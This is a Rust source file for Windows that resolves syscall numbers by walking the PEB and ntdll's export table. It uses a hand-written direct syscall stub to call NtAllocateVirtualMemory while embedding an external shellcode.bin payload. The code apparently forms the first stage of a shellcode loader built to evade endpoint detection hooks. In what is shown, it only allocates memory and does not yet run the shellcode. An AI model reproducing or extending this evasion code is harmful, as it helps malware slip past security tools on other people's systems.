use std::{
    arch::global_asm, collections::BTreeMap, ffi::CStr, ops::Add, os::raw::c_void, ptr::null_mut,
};

use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
use windows_sys::Win32::System::{
    Diagnostics::Debug::IMAGE_NT_HEADERS64,
    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

global_asm!(
    "
    .section .data
    SSN: .word 0
    
    .section .text
    NtAllocateVirtualMemory:
        mov r10, rcx
        mov rax, [rip + SSN]
        syscall
        ret
    "
);

unsafe extern "system" {
    fn NtAllocateVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> i32;
}

unsafe extern "C" {
    static mut SSN: u32;
}

fn get_current_teb() -> PTEB {
    let teb: PTEB;
    unsafe {
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb,
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb,
        );
    }
    teb
}

fn gen_ssn_table() -> BTreeMap<usize, String> {
    let mut map: BTreeMap<usize, String> = BTreeMap::new();
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            println!("[-] Invalid PEB");
            return map;
        }

        let ldr_data_table = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = (*ldr_data_table).DllBase;
        println!("[+] ntdll.dll base address: {:?}", ntdll_base);

        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header");
            return map;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT header");
            return map;
        }

        let export_directory = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfFunctions as usize)
            as *const u32;
        let address_of_names = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNames as usize)
            as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNameOrdinals as usize)
            as *const u16;

        let mut index = 0;
        for i in 0..(*export_directory).NumberOfNames as isize {
            let name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;
            let name = CStr::from_ptr(name);
            if let Ok(func_name) = name.to_str() {
                if func_name.starts_with("Nt")
                    && !func_name.starts_with("Ntdll")
                    && func_name != "NtGetTickCount"
                {
                    let ordinal = *address_of_name_ordinals.offset(i) as usize;

                    if ordinal >= (*export_directory).NumberOfFunctions as usize {
                        continue;
                    }
                    let function_rva = *address_of_functions.offset(ordinal as isize);
                    let function_addr = (ntdll_base as *const u8).add(function_rva as usize);
                    index = index.add(1);
                    map.insert(function_addr as usize, func_name.to_string());
                    // println!(
                    //     "[+] [{}] Found: {} @ 0x{:X}",
                    //     index, func_name, function_addr as usize
                    // );
                }
            }
        }
    }

    map
}

fn get_ssn(function_name: &str) -> u32 {
    let ssn_table = gen_ssn_table();

    ssn_table
        .iter()
        .enumerate()
        .find(|(_, (_, name))| name.as_str() == function_name)
        .map(|(pos, _)| pos as u32)
        .expect("Invalid function name")
}

fn main() {
    let ssn = get_ssn("NtAllocateVirtualMemory");
    println!("[+] NtAllocateVirtualMemory SSN: 0x{:X}", ssn);

    let mut base_address = null_mut();
    let mut size = SHELLCODE.len();

    unsafe {
        SSN = ssn;
    }

    let status = unsafe {
        NtAllocateVirtualMemory(
            -1isize as *mut c_void,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if status != 0 {
        println!(
            "[-] NtAllocateVirtualMemory failed with status: 0x{:X}",
            status
        );
        return;
    }

    println!("[+] Allocated {} bytes @ {:p}", size, base_address);
}
